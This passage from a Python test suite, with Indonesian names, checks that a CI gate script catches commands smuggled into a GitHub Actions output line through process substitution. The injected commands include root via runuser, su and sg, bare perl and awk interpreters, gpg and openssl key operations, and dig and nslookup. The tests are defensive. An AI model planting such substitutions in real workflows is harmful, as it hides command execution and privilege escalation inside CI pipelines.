                    "> >(openssl pkeyutl -inkey kunci.pem -sign; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru215 != isi_aksi215, \
            "suntikan aksi215 tidak menembak"
        with open(berkas_aksi215, "w", encoding="utf-8") as f:
            f.write(isi_baru215)
        rc, out = jalan(sub215,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl pkeyutl: gerbang gagal (Audit 1104)", rc != 0)
        shutil.rmtree(sub215, ignore_errors=True)

        sub216 = klon(tmp, "sub216")
        berkas_aksi216 = os.path.join(
            sub216, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi216, encoding="utf-8") as f:
            isi_aksi216 = f.read()
        baris_aksi216 = [b for b in isi_aksi216.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru216 = isi_aksi216.replace(
                baris_aksi216,
                baris_aksi216.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl x509; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru216 != isi_aksi216, \
            "suntikan aksi216 tidak menembak"
        with open(berkas_aksi216, "w", encoding="utf-8") as f:
            f.write(isi_baru216)
        rc, out = jalan(sub216,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl x509 tanpa -in: gerbang gagal (Audit 1105)", rc != 0)
        shutil.rmtree(sub216, ignore_errors=True)

        sub217 = klon(tmp, "sub217")
        berkas_aksi217 = os.path.join(
            sub217, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi217, encoding="utf-8") as f:
            isi_aksi217 = f.read()
        baris_aksi217 = [b for b in isi_aksi217.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru217 = isi_aksi217.replace(
                baris_aksi217,
                baris_aksi217.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(gpg --batch --import; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru217 != isi_aksi217, \
            "suntikan aksi217 tidak menembak"
        with open(berkas_aksi217, "w", encoding="utf-8") as f:
            f.write(isi_baru217)
        rc, out = jalan(sub217,
                        [sys.executable, GERBANG, "--semua"])
        periksa("gpg --import: gerbang gagal (Audit 1106)", rc != 0)
        shutil.rmtree(sub217, ignore_errors=True)

        sub218 = klon(tmp, "sub218")
        berkas_aksi218 = os.path.join(
            sub218, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi218, encoding="utf-8") as f:
            isi_aksi218 = f.read()
        baris_aksi218 = [b for b in isi_aksi218.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru218 = isi_aksi218.replace(
                baris_aksi218,
                baris_aksi218.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(gpg --batch --dearmor; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru218 != isi_aksi218, \
            "suntikan aksi218 tidak menembak"
        with open(berkas_aksi218, "w", encoding="utf-8") as f:
            f.write(isi_baru218)
        rc, out = jalan(sub218,
                        [sys.executable, GERBANG, "--semua"])
        periksa("gpg --dearmor: gerbang gagal (Audit 1106)", rc != 0)
        shutil.rmtree(sub218, ignore_errors=True)

        sub219 = klon(tmp, "sub219")
        berkas_aksi219 = os.path.join(
            sub219, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi219, encoding="utf-8") as f:
            isi_aksi219 = f.read()
        baris_aksi219 = [b for b in isi_aksi219.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru219 = isi_aksi219.replace(
                baris_aksi219,
                baris_aksi219.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(gpg --batch --print-md SHA256; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru219 != isi_aksi219, \
            "suntikan aksi219 tidak menembak"
        with open(berkas_aksi219, "w", encoding="utf-8") as f:
            f.write(isi_baru219)
        rc, out = jalan(sub219,
                        [sys.executable, GERBANG, "--semua"])
        periksa("gpg --print-md: gerbang gagal (Audit 1106)", rc != 0)
        shutil.rmtree(sub219, ignore_errors=True)

        sub220 = klon(tmp, "sub220")
        berkas_aksi220 = os.path.join(
            sub220, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi220, encoding="utf-8") as f:
            isi_aksi220 = f.read()
        baris_aksi220 = [b for b in isi_aksi220.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru220 = isi_aksi220.replace(
                baris_aksi220,
                baris_aksi220.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(strace cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru220 != isi_aksi220, \
            "suntikan aksi220 tidak menembak"
        with open(berkas_aksi220, "w", encoding="utf-8") as f:
            f.write(isi_baru220)
        rc, out = jalan(sub220,
                        [sys.executable, GERBANG, "--semua"])
        periksa("strace pembungkus: gerbang gagal (Audit 1107)", rc != 0)
        shutil.rmtree(sub220, ignore_errors=True)

        sub221 = klon(tmp, "sub221")
        berkas_aksi221 = os.path.join(
            sub221, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi221, encoding="utf-8") as f:
            isi_aksi221 = f.read()
        baris_aksi221 = [b for b in isi_aksi221.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru221 = isi_aksi221.replace(
                baris_aksi221,
                baris_aksi221.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(strace -f -o jejak cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru221 != isi_aksi221, \
            "suntikan aksi221 tidak menembak"
        with open(berkas_aksi221, "w", encoding="utf-8") as f:
            f.write(isi_baru221)
        rc, out = jalan(sub221,
                        [sys.executable, GERBANG, "--semua"])
        periksa("strace beropsi: gerbang gagal (Audit 1107)", rc != 0)
        shutil.rmtree(sub221, ignore_errors=True)

        sub222 = klon(tmp, "sub222")
        berkas_aksi222 = os.path.join(
            sub222, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi222, encoding="utf-8") as f:
            isi_aksi222 = f.read()
        baris_aksi222 = [b for b in isi_aksi222.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru222 = isi_aksi222.replace(
                baris_aksi222,
                baris_aksi222.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(dbus-run-session cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru222 != isi_aksi222, \
            "suntikan aksi222 tidak menembak"
        with open(berkas_aksi222, "w", encoding="utf-8") as f:
            f.write(isi_baru222)
        rc, out = jalan(sub222,
                        [sys.executable, GERBANG, "--semua"])
        periksa("dbus-run-session: gerbang gagal (Audit 1107)", rc != 0)
        shutil.rmtree(sub222, ignore_errors=True)

        sub223 = klon(tmp, "sub223")
        berkas_aksi223 = os.path.join(
            sub223, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi223, encoding="utf-8") as f:
            isi_aksi223 = f.read()
        baris_aksi223 = [b for b in isi_aksi223.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru223 = isi_aksi223.replace(
                baris_aksi223,
                baris_aksi223.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(runuser -u root -- cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru223 != isi_aksi223, \
            "suntikan aksi223 tidak menembak"
        with open(berkas_aksi223, "w", encoding="utf-8") as f:
            f.write(isi_baru223)
        rc, out = jalan(sub223,
                        [sys.executable, GERBANG, "--semua"])
        periksa("runuser: gerbang gagal (Audit 1107)", rc != 0)
        shutil.rmtree(sub223, ignore_errors=True)

        sub224 = klon(tmp, "sub224")
        berkas_aksi224 = os.path.join(
            sub224, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi224, encoding="utf-8") as f:
            isi_aksi224 = f.read()
        baris_aksi224 = [b for b in isi_aksi224.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru224 = isi_aksi224.replace(
                baris_aksi224,
                baris_aksi224.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(su -c cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru224 != isi_aksi224, \
            "suntikan aksi224 tidak menembak"
        with open(berkas_aksi224, "w", encoding="utf-8") as f:
            f.write(isi_baru224)
        rc, out = jalan(sub224,
                        [sys.executable, GERBANG, "--semua"])
        periksa("su -c string: gerbang gagal (Audit 1107)", rc != 0)
        shutil.rmtree(sub224, ignore_errors=True)

        sub225 = klon(tmp, "sub225")
        berkas_aksi225 = os.path.join(
            sub225, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi225, encoding="utf-8") as f:
            isi_aksi225 = f.read()
        baris_aksi225 = [b for b in isi_aksi225.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru225 = isi_aksi225.replace(
                baris_aksi225,
                baris_aksi225.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sg root -c cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru225 != isi_aksi225, \
            "suntikan aksi225 tidak menembak"
        with open(berkas_aksi225, "w", encoding="utf-8") as f:
            f.write(isi_baru225)
        rc, out = jalan(sub225,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sg -c string: gerbang gagal (Audit 1107)", rc != 0)
        shutil.rmtree(sub225, ignore_errors=True)

        sub226 = klon(tmp, "sub226")
        berkas_aksi226 = os.path.join(
            sub226, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi226, encoding="utf-8") as f:
            isi_aksi226 = f.read()
        baris_aksi226 = [b for b in isi_aksi226.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru226 = isi_aksi226.replace(
                baris_aksi226,
                baris_aksi226.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(vi berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru226 != isi_aksi226, \
            "suntikan aksi226 tidak menembak"
        with open(berkas_aksi226, "w", encoding="utf-8") as f:
            f.write(isi_baru226)
        rc, out = jalan(sub226,
                        [sys.executable, GERBANG, "--semua"])
        periksa("vi beroperand: gerbang gagal (Audit 1108)", rc != 0)
        shutil.rmtree(sub226, ignore_errors=True)

        sub227 = klon(tmp, "sub227")
        berkas_aksi227 = os.path.join(
            sub227, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi227, encoding="utf-8") as f:
            isi_aksi227 = f.read()
        baris_aksi227 = [b for b in isi_aksi227.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru227 = isi_aksi227.replace(
                baris_aksi227,
                baris_aksi227.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(view berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru227 != isi_aksi227, \
            "suntikan aksi227 tidak menembak"
        with open(berkas_aksi227, "w", encoding="utf-8") as f:
            f.write(isi_baru227)
        rc, out = jalan(sub227,
                        [sys.executable, GERBANG, "--semua"])
        periksa("view beroperand: gerbang gagal (Audit 1108)", rc != 0)
        shutil.rmtree(sub227, ignore_errors=True)

        sub228 = klon(tmp, "sub228")
        berkas_aksi228 = os.path.join(
            sub228, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi228, encoding="utf-8") as f:
            isi_aksi228 = f.read()
        baris_aksi228 = [b for b in isi_aksi228.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru228 = isi_aksi228.replace(
                baris_aksi228,
                baris_aksi228.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(ex; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru228 != isi_aksi228, \
            "suntikan aksi228 tidak menembak"
        with open(berkas_aksi228, "w", encoding="utf-8") as f:
            f.write(isi_baru228)
        rc, out = jalan(sub228,
                        [sys.executable, GERBANG, "--semua"])
        periksa("ex polos: gerbang gagal (Audit 1108)", rc != 0)
        shutil.rmtree(sub228, ignore_errors=True)

        sub229 = klon(tmp, "sub229")
        berkas_aksi229 = os.path.join(
            sub229, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi229, encoding="utf-8") as f:
            isi_aksi229 = f.read()
        baris_aksi229 = [b for b in isi_aksi229.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru229 = isi_aksi229.replace(
                baris_aksi229,
                baris_aksi229.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(less -p UTUH; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru229 != isi_aksi229, \
            "suntikan aksi229 tidak menembak"
        with open(berkas_aksi229, "w", encoding="utf-8") as f:
            f.write(isi_baru229)
        rc, out = jalan(sub229,
                        [sys.executable, GERBANG, "--semua"])
        periksa("less -p pola bernilai: gerbang gagal (Audit 1109)", rc != 0)
        shutil.rmtree(sub229, ignore_errors=True)

        sub230 = klon(tmp, "sub230")
        berkas_aksi230 = os.path.join(
            sub230, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi230, encoding="utf-8") as f:
            isi_aksi230 = f.read()
        baris_aksi230 = [b for b in isi_aksi230.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru230 = isi_aksi230.replace(
                baris_aksi230,
                baris_aksi230.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(comm --output-delimiter - berkas berkas2; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru230 != isi_aksi230, \
            "suntikan aksi230 tidak menembak"
        with open(berkas_aksi230, "w", encoding="utf-8") as f:
            f.write(isi_baru230)
        rc, out = jalan(sub230,
                        [sys.executable, GERBANG, "--semua"])
        periksa("comm --output-delimiter '-': gerbang lolos (Audit 1110)", rc == 0)
        shutil.rmtree(sub230, ignore_errors=True)

        sub231 = klon(tmp, "sub231")
        berkas_aksi231 = os.path.join(
            sub231, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi231, encoding="utf-8") as f:
            isi_aksi231 = f.read()
        baris_aksi231 = [b for b in isi_aksi231.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru231 = isi_aksi231.replace(
                baris_aksi231,
                baris_aksi231.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(du --files0-from=-; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru231 != isi_aksi231, \
            "suntikan aksi231 tidak menembak"
        with open(berkas_aksi231, "w", encoding="utf-8") as f:
            f.write(isi_baru231)
        rc, out = jalan(sub231,
                        [sys.executable, GERBANG, "--semua"])
        periksa("du --files0-from=-: gerbang gagal (Audit 1111)", rc != 0)
        shutil.rmtree(sub231, ignore_errors=True)

        sub232 = klon(tmp, "sub232")
        berkas_aksi232 = os.path.join(
            sub232, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi232, encoding="utf-8") as f:
            isi_aksi232 = f.read()
        baris_aksi232 = [b for b in isi_aksi232.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru232 = isi_aksi232.replace(
                baris_aksi232,
                baris_aksi232.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(find -files0-from - -maxdepth 0; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru232 != isi_aksi232, \
            "suntikan aksi232 tidak menembak"
        with open(berkas_aksi232, "w", encoding="utf-8") as f:
            f.write(isi_baru232)
        rc, out = jalan(sub232,
                        [sys.executable, GERBANG, "--semua"])
        periksa("find -files0-from: gerbang gagal (Audit 1111)", rc != 0)
        shutil.rmtree(sub232, ignore_errors=True)

        sub233 = klon(tmp, "sub233")
        berkas_aksi233 = os.path.join(
            sub233, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi233, encoding="utf-8") as f:
            isi_aksi233 = f.read()
        baris_aksi233 = [b for b in isi_aksi233.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru233 = isi_aksi233.replace(
                baris_aksi233,
                baris_aksi233.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(wall; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru233 != isi_aksi233, \
            "suntikan aksi233 tidak menembak"
        with open(berkas_aksi233, "w", encoding="utf-8") as f:
            f.write(isi_baru233)
        rc, out = jalan(sub233,
                        [sys.executable, GERBANG, "--semua"])
        periksa("wall polos: gerbang gagal (Audit 1112)", rc != 0)
        shutil.rmtree(sub233, ignore_errors=True)

        sub234 = klon(tmp, "sub234")
        berkas_aksi234 = os.path.join(
            sub234, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi234, encoding="utf-8") as f:
            isi_aksi234 = f.read()
        baris_aksi234 = [b for b in isi_aksi234.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru234 = isi_aksi234.replace(
                baris_aksi234,
                baris_aksi234.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(c++filt; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru234 != isi_aksi234, \
            "suntikan aksi234 tidak menembak"
        with open(berkas_aksi234, "w", encoding="utf-8") as f:
            f.write(isi_baru234)
        rc, out = jalan(sub234,
                        [sys.executable, GERBANG, "--semua"])
        periksa("c++filt polos: gerbang gagal (Audit 1112)", rc != 0)
        shutil.rmtree(sub234, ignore_errors=True)

        sub235 = klon(tmp, "sub235")
        berkas_aksi235 = os.path.join(
            sub235, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi235, encoding="utf-8") as f:
            isi_aksi235 = f.read()
        baris_aksi235 = [b for b in isi_aksi235.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru235 = isi_aksi235.replace(
                baris_aksi235,
                baris_aksi235.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(addr2line -e /usr/bin/cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru235 != isi_aksi235, \
            "suntikan aksi235 tidak menembak"
        with open(berkas_aksi235, "w", encoding="utf-8") as f:
            f.write(isi_baru235)
        rc, out = jalan(sub235,
                        [sys.executable, GERBANG, "--semua"])
        periksa("addr2line -e: gerbang gagal (Audit 1112)", rc != 0)
        shutil.rmtree(sub235, ignore_errors=True)

        sub236 = klon(tmp, "sub236")
        berkas_aksi236 = os.path.join(
            sub236, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi236, encoding="utf-8") as f:
            isi_aksi236 = f.read()
        baris_aksi236 = [b for b in isi_aksi236.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru236 = isi_aksi236.replace(
                baris_aksi236,
                baris_aksi236.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(dig -f -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru236 != isi_aksi236, \
            "suntikan aksi236 tidak menembak"
        with open(berkas_aksi236, "w", encoding="utf-8") as f:
            f.write(isi_baru236)
        rc, out = jalan(sub236,
                        [sys.executable, GERBANG, "--semua"])
        periksa("dig -f '-': gerbang gagal (Audit 1112)", rc != 0)
        shutil.rmtree(sub236, ignore_errors=True)

        sub237 = klon(tmp, "sub237")
        berkas_aksi237 = os.path.join(
            sub237, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi237, encoding="utf-8") as f:
            isi_aksi237 = f.read()
        baris_aksi237 = [b for b in isi_aksi237.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru237 = isi_aksi237.replace(
                baris_aksi237,
                baris_aksi237.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(nslookup; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru237 != isi_aksi237, \
            "suntikan aksi237 tidak menembak"
        with open(berkas_aksi237, "w", encoding="utf-8") as f:
            f.write(isi_baru237)
        rc, out = jalan(sub237,
                        [sys.executable, GERBANG, "--semua"])
        periksa("nslookup polos: gerbang gagal (Audit 1112)", rc != 0)
        shutil.rmtree(sub237, ignore_errors=True)

        sub238 = klon(tmp, "sub238")
        berkas_aksi238 = os.path.join(
            sub238, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi238, encoding="utf-8") as f:
            isi_aksi238 = f.read()
        baris_aksi238 = [b for b in isi_aksi238.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru238 = isi_aksi238.replace(
                baris_aksi238,
                baris_aksi238.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(original-awk '{print}'; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru238 != isi_aksi238, \
            "suntikan aksi238 tidak menembak"
        with open(berkas_aksi238, "w", encoding="utf-8") as f:
            f.write(isi_baru238)
        rc, out = jalan(sub238,
                        [sys.executable, GERBANG, "--semua"])
        periksa("original-awk: gerbang gagal (Audit 1113)", rc != 0)
        shutil.rmtree(sub238, ignore_errors=True)

        sub239 = klon(tmp, "sub239")
        berkas_aksi239 = os.path.join(
            sub239, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi239, encoding="utf-8") as f:
            isi_aksi239 = f.read()
        baris_aksi239 = [b for b in isi_aksi239.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru239 = isi_aksi239.replace(
                baris_aksi239,
                baris_aksi239.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(perl; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru239 != isi_aksi239, \
            "suntikan aksi239 tidak menembak"
        with open(berkas_aksi239, "w", encoding="utf-8") as f:
            f.write(isi_baru239)
        rc, out = jalan(sub239,
                        [sys.executable, GERBANG, "--semua"])
        periksa("perl telanjang: gerbang gagal (Audit 1119)", rc != 0)
        shutil.rmtree(sub239, ignore_errors=True)
        sub240 = klon(tmp, "sub240")
        berkas_aksi240 = os.path.join(
            sub240, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi240, encoding="utf-8") as f:
            isi_aksi240 = f.read()
        baris_aksi240 = [b for b in isi_aksi240.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru240 = isi_aksi240.replace(
                baris_aksi240,
                baris_aksi240.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(perl -w; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru240 != isi_aksi240, \
            "suntikan aksi240 tidak menembak"
        with open(berkas_aksi240, "w", encoding="utf-8") as f:
            f.write(isi_baru240)
        rc, out = jalan(sub240,
                        [sys.executable, GERBANG, "--semua"])
        periksa("perl -w: gerbang gagal (Audit 1119)", rc != 0)
        shutil.rmtree(sub240, ignore_errors=True)
        sub241 = klon(tmp, "sub241")
        berkas_aksi241 = os.path.join(
            sub241, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi241, encoding="utf-8") as f:
            isi_aksi241 = f.read()
        baris_aksi241 = [b for b in isi_aksi241.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru241 = isi_aksi241.replace(
                baris_aksi241,
                baris_aksi241.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(perl skrip.pl; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru241 != isi_aksi241, \
            "suntikan aksi241 tidak menembak"
        with open(berkas_aksi241, "w", encoding="utf-8") as f:
            f.write(isi_baru241)
        rc, out = jalan(sub241,
                        [sys.executable, GERBANG, "--semua"])
        periksa("perl berkas skrip: gerbang lolos (Audit 1119)", rc == 0)
        shutil.rmtree(sub241, ignore_errors=True)
        sub242 = klon(tmp, "sub242")
        berkas_aksi242 = os.path.join(
            sub242, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi242, encoding="utf-8") as f:
            isi_aksi242 = f.read()
        baris_aksi242 = [b for b in isi_aksi242.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru242 = isi_aksi242.replace(
                baris_aksi242,
                baris_aksi242.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(perl -e print; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru242 != isi_aksi242, \
            "suntikan aksi242 tidak menembak"
        with open(berkas_aksi242, "w", encoding="utf-8") as f:
            f.write(isi_baru242)
        rc, out = jalan(sub242,
                        [sys.executable, GERBANG, "--semua"])
        periksa("perl -e: gerbang lolos (Audit 1119)", rc == 0)
        shutil.rmtree(sub242, ignore_errors=True)
        sub243 = klon(tmp, "sub243")
        berkas_aksi243 = os.path.join(
            sub243, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi243, encoding="utf-8") as f:
            isi_aksi243 = f.read()
        baris_aksi243 = [b for b in isi_aksi243.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru243 = isi_aksi243.replace(
                baris_aksi243,
                baris_aksi243.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar t; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru243 != isi_aksi243, \
            "suntikan aksi243 tidak menembak"
        with open(berkas_aksi243, "w", encoding="utf-8") as f:
            f.write(isi_baru243)
        rc, out = jalan(sub243,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar t tanpa -f: gerbang gagal (Audit 1120)", rc != 0)
        shutil.rmtree(sub243, ignore_errors=True)
        sub244 = klon(tmp, "sub244")
        berkas_aksi244 = os.path.join(
            sub244, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi244, encoding="utf-8") as f:
            isi_aksi244 = f.read()
        baris_aksi244 = [b for b in isi_aksi244.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru244 = isi_aksi244.replace(
                baris_aksi244,
                baris_aksi244.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar x; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru244 != isi_aksi244, \
            "suntikan aksi244 tidak menembak"
        with open(berkas_aksi244, "w", encoding="utf-8") as f:
            f.write(isi_baru244)
        rc, out = jalan(sub244,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar x tanpa -f: gerbang gagal (Audit 1120)", rc != 0)
        shutil.rmtree(sub244, ignore_errors=True)
        sub245 = klon(tmp, "sub245")
        berkas_aksi245 = os.path.join(
            sub245, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi245, encoding="utf-8") as f:
            isi_aksi245 = f.read()
        baris_aksi245 = [b for b in isi_aksi245.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru245 = isi_aksi245.replace(
                baris_aksi245,
                baris_aksi245.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar tf contoh.tar; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru245 != isi_aksi245, \
            "suntikan aksi245 tidak menembak"
        with open(berkas_aksi245, "w", encoding="utf-8") as f:
            f.write(isi_baru245)
        rc, out = jalan(sub245,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar tf berarsip: gerbang lolos (Audit 1120)", rc == 0)
        shutil.rmtree(sub245, ignore_errors=True)
        sub246 = klon(tmp, "sub246")
        berkas_aksi246 = os.path.join(
            sub246, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi246, encoding="utf-8") as f:
            isi_aksi246 = f.read()
        baris_aksi246 = [b for b in isi_aksi246.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru246 = isi_aksi246.replace(
                baris_aksi246,
                baris_aksi246.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar c; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru246 != isi_aksi246, \
            "suntikan aksi246 tidak menembak"
        with open(berkas_aksi246, "w", encoding="utf-8") as f:
            f.write(isi_baru246)
        rc, out = jalan(sub246,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar c tanpa operand: gerbang lolos (Audit 1120)", rc == 0)
        shutil.rmtree(sub246, ignore_errors=True)
        sub247 = klon(tmp, "sub247")
        berkas_aksi247 = os.path.join(
            sub247, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi247, encoding="utf-8") as f:
            isi_aksi247 = f.read()
        baris_aksi247 = [b for b in isi_aksi247.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru247 = isi_aksi247.replace(
                baris_aksi247,
                baris_aksi247.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(unshare -r; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru247 != isi_aksi247, \
            "suntikan aksi247 tidak menembak"
        with open(berkas_aksi247, "w", encoding="utf-8") as f:
            f.write(isi_baru247)
        rc, out = jalan(sub247,
                        [sys.executable, GERBANG, "--semua"])
        periksa("unshare tanpa perintah: gerbang gagal (Audit 1121)", rc != 0)
        shutil.rmtree(sub247, ignore_errors=True)
        sub248 = klon(tmp, "sub248")
        berkas_aksi248 = os.path.join(
            sub248, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi248, encoding="utf-8") as f:
            isi_aksi248 = f.read()
        baris_aksi248 = [b for b in isi_aksi248.splitlines()
